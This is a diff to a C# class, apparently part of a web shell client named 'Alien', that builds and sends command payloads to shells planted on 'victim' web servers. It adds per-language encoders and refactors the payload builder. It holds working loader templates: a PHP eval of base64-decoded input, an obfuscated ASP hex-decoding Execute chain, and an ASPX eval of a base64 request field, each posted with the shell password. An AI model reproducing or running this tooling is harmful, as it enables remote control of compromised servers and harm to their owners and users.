@@ -12,7 +12,9 @@ namespace Alien
         public clsVictim m_victim { get; set; }
         public HttpClient m_clnt { get; set; }
 
-
+        /// <summary>
+        /// 
+        /// </summary>
         private Dictionary<enLanguage, string> m_dicSuffix = new Dictionary<enLanguage, string>()
         {
             { enLanguage.PHP, "php" },
@@ -25,6 +27,10 @@ namespace Alien
             { enLanguage.CGI, "cgi" },
             { enLanguage.Python, "py" },
         };
+
+        /// <summary>
+        /// 
+        /// </summary>
         private Dictionary<enLanguage, string[]> m_dicRemoveSyntax = new Dictionary<enLanguage, string[]>()
         {
             {
@@ -42,17 +48,33 @@ namespace Alien
                 }
             }
         };
+
+        /// <summary>
+        /// 
+        /// </summary>
         private Dictionary<enLanguage, string> m_dicDecodeFunc = new Dictionary<enLanguage, string>()
         {
             { enLanguage.PHP, "@eval(base64_decode('[PATTERN]'));" },
             { enLanguage.ASP, @"Execute(""Execute(""""On+Error+Resume+Next:Function+bd%28byVal+s%29%3AFor+i%3D1+To+Len%28s%29+Step+2%3Ac%3DMid%28s%2Ci%2C2%29%3AIf+IsNumeric%28Mid%28s%2Ci%2C1%29%29+Then%3AExecute%28%22%22%22%22bd%3Dbd%26chr%28%26H%22%22%22%22%26c%26%22%22%22%22%29%22%22%22%22%29%3AElse%3AExecute%28%22%22%22%22bd%3Dbd%26chr%28%26H%22%22%22%22%26c%26Mid%28s%2Ci%2B2%2C2%29%26%22%22%22%22%29%22%22%22%22%29%3Ai%3Di%2B2%3AEnd+If%22%22%26chr%2810%29%26%22%22Next%3AEnd+Function:Execute(""""""""On+Error+Resume+Next:""""""""%26bd(""""""""[PATTERN]"""""""")):Response.End"""")"")" },
             { enLanguage.ASPX, @"var a0=Request.Item[""PATTERN""];var err:Exception;eval(System.Text.Encoding.GetEncoding(""[WEncoding]"").GetString(System.Convert.FromBase64String(a0)),""unsafe"");Response.End();" }
         };
+
+        /// <summary>
+        /// 
+        /// </summary>
         private Dictionary<enLanguage, string> m_dicSplitter = new Dictionary<enLanguage, string>()
         {
             { enLanguage.PHP, "echo(\"[SPLITTER]\");" },
             { enLanguage.ASP, "Response.Write(\"[SPLITTER]\");" },
             { enLanguage.ASPX, "Response.Write(\"[SPLITTER]\");" }
+        };
+
+        private Dictionary<enLanguage, Func<string, string>> m_dicEncapusulator = new Dictionary<enLanguage, Func<string, string>>()
+        {
+            { enLanguage.PHP, clsEzData.fnszStre2b64 },
+            { enLanguage.ASP, szInput => Convert.ToHexString(Encoding.UTF8.GetBytes(szInput)) },
+            { enLanguage.ASPX, clsEzData.fnszStre2b64 },
+            { enLanguage.JSP, szInput => szInput } // nop
         };
 
         public clsWeb(clsVictim victim)
@@ -216,8 +238,11 @@ namespace Alien
             for (int i = 0; i < asParams.Length; i++)
                 asParams[i] = $"z{i}={clsEzData.fnszStre2b64(asParams[i])}";
 
+            string szMain = m_dicEncapusulator[m_victim.ShellLanguage](szPayload);
+            string szLoader = m_dicDecodeFunc[m_victim.ShellLanguage].Replace("[PATTERN]", szMain);
             string szParams = string.Join("&", asParams);
-            szPayload = $"{m_victim.ShellPassword}={m_dicDecodeFunc[m_victim.ShellLanguage].Replace("[PATTERN]", clsEzData.fnszStre2b64(szPayload))}&{szParams}";
+
+            szPayload = $"{m_victim.ShellPassword}={szLoader}&{szParams}";
 
             return await fnabHttpPOST(szPayload, szSplitter);
         }
